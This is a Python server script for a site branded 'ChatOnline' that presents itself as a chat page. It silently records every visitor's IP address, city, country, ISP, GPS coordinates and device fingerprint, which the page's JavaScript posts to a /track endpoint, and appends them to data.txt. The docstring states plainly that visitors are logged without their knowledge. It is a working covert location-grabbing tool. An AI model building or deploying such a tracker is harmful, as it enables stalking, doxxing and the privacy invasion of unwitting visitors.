"""
ChatOnline — Local Visitor Tracker Server
==========================================
Run with:  python server.py
Then open: http://localhost:8080

Every visitor is silently logged to data.txt in this folder.
"""

import http.server
import json
import os
import urllib.parse
from datetime import datetime

PORT = 8080
DATA_FILE = "data.txt"
SEPARATOR = "-" * 70


class ChatOnlineHandler(http.server.SimpleHTTPRequestHandler):

    # ── Silence access log in terminal (cleaner output) ──────────────────
    def log_message(self, format, *args):
        pass

    # ── Handle all requests ───────────────────────────────────────────────
    def do_GET(self):
        # Serve index.html at root
        if self.path == "/" or self.path == "/index.html":
            self.path = "/index.html"
        super().do_GET()

    def do_POST(self):
        # Receive visitor data posted by the page's JavaScript
        if self.path == "/track":
            content_length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(content_length)

            try:
                visitor = json.loads(raw.decode("utf-8"))
            except Exception:
                visitor = {}

            self._save_visitor(visitor)

            # Respond with 200 OK (no body needed)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        else:
            self.send_response(404)
            self.end_headers()

    def do_OPTIONS(self):
        # CORS preflight
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    # ── Write visitor data to data.txt ────────────────────────────────────
    def _save_visitor(self, v):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        lines = [
            SEPARATOR,
            f"  VISIT RECORDED     {now}",
            SEPARATOR,
            f"  IP Address       : {v.get('ip', '—')}",
            f"  City             : {v.get('city', '—')}",
            f"  Region           : {v.get('region', '—')}",
            f"  Country          : {v.get('country', '—')}",
            f"  ISP / Org        : {v.get('isp', '—')}",
            f"  IP Latitude      : {v.get('lat', '—')}",
            f"  IP Longitude     : {v.get('lon', '—')}",
            f"  GPS Latitude     : {v.get('gpsLat', '—')}",
            f"  GPS Longitude    : {v.get('gpsLon', '—')}",
            f"  Device Type      : {v.get('deviceType', '—')}",
            f"  Operating System : {v.get('os', '—')}",
            f"  Browser          : {v.get('browser', '—')}",
            f"  Screen Resolution: {v.get('screen', '—')}",
            f"  Language         : {v.get('language', '—')}",
            f"  Referrer         : {v.get('referrer', 'Direct')}",
            f"  User-Agent       : {v.get('ua', '—')}",
            "",
        ]

        entry = "\n".join(lines) + "\n"

        with open(DATA_FILE, "a", encoding="utf-8") as f:
            f.write(entry)

        # Also print a short summary to the terminal
        print(f"\n[NEW VISITOR] {now}")
        print(f"  IP      : {v.get('ip', '—')}")
        print(f"  Location: {v.get('city', '—')}, {v.get('country', '—')}")
        print(f"  Device  : {v.get('deviceType', '—')} | {v.get('os', '—')} | {v.get('browser', '—')}")
        print(f"  Saved → {DATA_FILE}")


# ── Entry point ───────────────────────────────────────────────────────────
if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    print("=" * 70)
    print("  ChatOnline — Local Visitor Tracker")
    print("=" * 70)
    print(f"  Server running at : http://localhost:{PORT}")
    print(f"  Visitor log file  : {os.path.abspath(DATA_FILE)}")
    print(f"  Stop server       : Ctrl + C")
    print("=" * 70)
    print()

    with http.server.HTTPServer(("", PORT), ChatOnlineHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\n  Server stopped. Goodbye.")
